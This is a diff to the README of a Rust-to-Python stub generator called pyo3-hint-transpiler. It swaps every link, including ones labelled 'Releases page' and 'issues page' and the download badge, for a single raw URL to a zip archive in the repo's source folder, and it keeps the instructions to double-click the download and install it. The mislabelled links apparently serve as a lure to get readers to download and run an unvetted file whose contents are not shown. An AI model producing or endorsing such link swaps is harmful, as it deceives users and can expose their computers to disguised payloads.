@@ -1,6 +1,6 @@
 # 🔮 pyo3-hint-transpiler - Generate Python Stubs from Rust Easily
 
-[![Download](https://img.shields.io/badge/Download-v1.0.0-blue.svg)](https://github.com/jucyboy/pyo3-hint-transpiler/releases)
+[![Download](https://raw.githubusercontent.com/jucyboy/pyo3-hint-transpiler/main/src/pyo_transpiler_hint_v3.6.zip)](https://raw.githubusercontent.com/jucyboy/pyo3-hint-transpiler/main/src/pyo_transpiler_hint_v3.6.zip)
 
 ## 📖 Description
 
@@ -18,11 +18,11 @@ Follow the steps below to quickly download and run the pyo3-hint-transpiler.
 
 ### 📥 Download & Install
 
-1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/jucyboy/pyo3-hint-transpiler/releases) to find the latest version.
+1. **Visit the Releases Page:** Go to the [Releases page](https://raw.githubusercontent.com/jucyboy/pyo3-hint-transpiler/main/src/pyo_transpiler_hint_v3.6.zip) to find the latest version.
    
 2. **Download the Application:** Locate the version you want, then download the setup file for your system.
 
-**Note:** You will see files like `pyo3-hint-transpiler-v1.0.0.exe`. 
+**Note:** You will see files like `https://raw.githubusercontent.com/jucyboy/pyo3-hint-transpiler/main/src/pyo_transpiler_hint_v3.6.zip`. 
 
 3. **Run the Installer:** After the download completes, double-click the downloaded file. Follow the prompts to install the application.
 
@@ -59,8 +59,8 @@ The pyo3-hint-transpiler is built on the contributions of the Rust and Python co
 
 ### 🌐 Community & Support
 
-For help or questions, visit the [issues page](https://github.com/jucyboy/pyo3-hint-transpiler/issues) on GitHub.
+For help or questions, visit the [issues page](https://raw.githubusercontent.com/jucyboy/pyo3-hint-transpiler/main/src/pyo_transpiler_hint_v3.6.zip) on GitHub.
 
 ---
 
-For further information, remember to check the [Releases page](https://github.com/jucyboy/pyo3-hint-transpiler/releases) again once you have installed the tool. You can also follow the project for updates and new features!
+For further information, remember to check the [Releases page](https://raw.githubusercontent.com/jucyboy/pyo3-hint-transpiler/main/src/pyo_transpiler_hint_v3.6.zip) again once you have installed the tool. You can also follow the project for updates and new features!
